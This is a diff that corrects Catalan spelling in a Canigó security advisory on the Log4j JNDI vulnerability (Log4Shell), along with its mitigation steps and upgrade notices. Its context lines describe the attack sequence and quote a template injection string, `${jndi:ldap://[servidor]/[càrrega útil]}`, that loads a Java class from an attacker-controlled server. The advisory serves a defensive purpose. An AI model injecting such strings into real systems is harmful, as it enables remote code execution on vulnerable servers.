@@ -12,12 +12,12 @@ servidor remot, injectant una petició JNDI `${jndi:(ldap|rmi|etc)}` dins de qua
 
 Per a explotar la vulnerabilitat, es poden seguir els següents passos:
 
-1. En el servidor que alloja l'aplicació vulnerable, es registra la informació que conté la càrrega útil maliciosa.
+1. En el servidor que allotja l'aplicació vulnerable, es registra la informació que conté la càrrega útil maliciosa.
 Per exemple: `${jndi:ldap://[servidor]/[càrrega útil]}`, on el servidor està controlat per l'atacant i la càrrega útil conté les comandes a executar.
 
 2. La vulnerabilitat s'activa i el servidor vulnerable, sol·licita al servidor de l'atacant a través de JNDI el codi maliciós.
 
-3. La resposta del servidor de l'atacant conté la ruta a una clase Java maliciosa. Per exemple: `http://[servidor]/exploit.class`,
+3. La resposta del servidor de l'atacant conté la ruta a una classe Java maliciosa. Per exemple: `http://[servidor]/exploit.class`,
 que s'injecta en el context de l'aplicació vulnerable.
 
 4. La càrrega útil injectada permet a l'atacant executar codi arbitrari.
@@ -65,7 +65,7 @@ mvn clean package docker:build \
 canigo/app
 ```
 
-* **Opció 3**) Modificar el patró de traces configuradas al fitxer `log4j.xml` (vàlid per a: 2.0-beta1 >= log4j <= 2.14.1) i tornar a compilar i desplegar l'aplicació. Veure: https://kb.vmware.com/s/article/87093.
+* **Opció 3**) Modificar el patró de traces configurades al fitxer `log4j.xml` (vàlid per a: 2.0-beta1 >= log4j <= 2.14.1) i tornar a compilar i desplegar l'aplicació. Veure: https://kb.vmware.com/s/article/87093.
 
 ```sh
 ## canviar:
@@ -88,7 +88,7 @@ Podeu consultar: [Actualització archetype 1.6.8](/noticies/2021-12-13-CAN-Actua
 Podeu consultar: [Actualització archetype 1.7.1 i plugin Eclipse 1.8.1](/noticies/2021-12-13-CAN-Actualitzacio_archetype_1_7_1_plugin_eclipse_1_8_1/).
 
 Des de CS Canigó es recomana actualitzar a aquestes noves versions. Per a fer-ho, serà necessari revisar les dependències de l'aplicació
-per a utilitzar els mòduls de les versions 3.4.7 i 3.6.1. Podeu consultar les matrius de compatibiltiat de les versions:
+per a utilitzar els mòduls de les versions 3.4.7 i 3.6.1. Podeu consultar les matrius de compatibilitat de les versions:
 
 - [Matrius de Compatibilitats 3.4](/canigo-download-related/matrius-compatibilitats/canigo-34/)
 
